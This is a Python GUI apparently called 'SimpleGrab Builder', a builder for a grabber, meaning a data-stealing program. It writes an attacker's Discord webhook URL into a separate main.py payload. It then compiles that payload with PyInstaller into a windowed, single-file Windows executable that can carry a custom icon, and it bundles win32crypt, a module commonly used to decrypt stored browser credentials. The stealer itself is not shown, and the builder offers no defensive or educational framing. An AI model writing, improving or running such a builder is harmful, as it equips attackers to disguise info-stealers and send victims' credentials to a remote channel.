import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
import os
import subprocess
import sys
import shutil
import urllib.request
from PIL import Image, ImageTk
from io import BytesIO

import sys
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


# ---------------- GUI Appearance ----------------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

# ---------------- Configuration ----------------
BASE_SCRIPT = "main.py"
BUILT_SCRIPT = "sg.py"
OUTPUT_DIR = "dist"
VERSION = "v1.0"

# ---------------- Functions ----------------
def build_all():
    webhook = webhook_entry.get().strip()
    exe_icon_path = exe_icon_var.get()

    if not webhook:
        messagebox.showerror("Error", "Please enter a webhook URL.")
        return

    if not os.path.exists(BASE_SCRIPT):
        messagebox.showerror("Error", f"{BASE_SCRIPT} not found.")
        return

    with open(BASE_SCRIPT, "r", encoding="utf-8") as f:
        content = f.read()

    if 'WEBHOOK_URL=""' not in content:
        messagebox.showerror("Error", 'main.py must contain: WEBHOOK_URL = ""')
        return

    updated = content.replace('WEBHOOK_URL=""', f'WEBHOOK_URL = "{webhook}"')

    with open(BUILT_SCRIPT, "w", encoding="utf-8") as f:
        f.write(updated)

    build_button.configure(text="Building EXE…", state="disabled")

    # Clean old build folders
    for target in ["build", OUTPUT_DIR, BUILT_SCRIPT.replace(".py", ".spec")]:
        if os.path.exists(target):
            try:
                if os.path.isdir(target):
                    shutil.rmtree(target)
                else:
                    os.remove(target)
            except:
                pass

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",
        "--clean",
        "--hidden-import=win32api",
        "--hidden-import=win32crypt",
        "--hidden-import=win32con",
        "--hidden-import=pywintypes",
        f"--distpath={OUTPUT_DIR}",
        "--workpath=build",
    ]

    if exe_icon_path:
        cmd.append(f"--icon={exe_icon_path}")  # Use user-specified EXE icon

    cmd.append(BUILT_SCRIPT)

    subprocess.run(cmd)

    build_button.configure(text="Build Script + EXE", state="normal")
    messagebox.showinfo("Success", f"EXE built inside ./{OUTPUT_DIR}/")

def select_exe_icon():
    path = filedialog.askopenfilename(title="Select EXE Icon", filetypes=[("ICO Files","*.ico")])
    if path:
        exe_icon_var.set(path)
        exe_icon_label.configure(text=os.path.basename(path))

# ---------------- GUI ----------------
app = ctk.CTk()
app.title("SimpleGrab Builder")
app.geometry("500x400")
app.resizable(False, False)

# Load builder icon from URL
icon_url = "https://raw.githubusercontent.com/Ragoon821/IP-Geolocator-for-Discord-Webhooks/refs/heads/main/Moneycat.png"
try:
    with urllib.request.urlopen(icon_url) as u:
        raw_data = u.read()
    img = Image.open(BytesIO(raw_data))
    img = img.resize((64, 64), Image.ANTIALIAS)
    img_tk = ImageTk.PhotoImage(img)
    app.iconphoto(False, img_tk)  # Set window icon directly from URL
except Exception as e:
    print("Failed to load icon from URL:", e)

# Main frame
frame = ctk.CTkFrame(app, corner_radius=15)
frame.pack(pady=20, padx=20, fill="both", expand=True)

# Title
title_label = ctk.CTkLabel(frame, text="SimpleGrabber", font=("Segoe UI", 28, "bold"))
title_label.pack(pady=(20,5))

# Version
version_label = ctk.CTkLabel(frame, text=f"Version {VERSION}", font=("Segoe UI", 14))
version_label.pack(pady=(0,20))

# Webhook input
webhook_entry = ctk.CTkEntry(frame, width=400, placeholder_text="Enter Discord Webhook URL...")
webhook_entry.pack(pady=10)

# EXE icon selection
exe_icon_var = tk.StringVar()
icon_button = ctk.CTkButton(frame, text="Select EXE Icon", command=select_exe_icon)
icon_button.pack(pady=(5,5))
exe_icon_label = ctk.CTkLabel(frame, text="No icon selected")
exe_icon_label.pack(pady=(0,15))

# Build button
build_button = ctk.CTkButton(frame, text="Build Script + EXE", command=build_all, width=220, height=45, corner_radius=12)
build_button.pack(pady=10)

# Footer
footer_label = ctk.CTkLabel(app, text="© SimpleGrab Builder", font=("Segoe UI", 10), text_color="#888888")
footer_label.pack(side="bottom", pady=10)

# Hide console on Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

app.mainloop()
